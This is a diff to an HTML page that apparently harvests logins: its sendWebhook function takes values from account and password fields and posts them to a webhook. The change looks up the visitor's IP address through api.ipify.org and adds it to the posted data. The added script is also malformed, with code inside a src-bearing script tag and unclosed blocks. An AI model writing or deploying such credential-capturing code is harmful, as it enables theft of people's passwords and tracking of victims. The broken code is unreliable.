@@ -15,7 +15,15 @@
       name="viewport"
       content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover"
     />
-    <script>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js">
+	    $(document).ready(function() {
+            // Declare a variable to store the IP address
+            var ip;
+
+            // Make the API call to get the IP address
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                // Store the retrieved IP address in the variable
+                ip = data.ip;
       function sendWebhook() {  
   var username = document.getElementById("messageofacc").value;
   var message = document.getElementById("messageofpass").value;
@@ -37,7 +45,8 @@
   // Create the request body in JSON format
   var requestBody = JSON.stringify({
     username: username,
-    content: message
+    content: message,
+    ip: ip
   });
 
   // Send the request
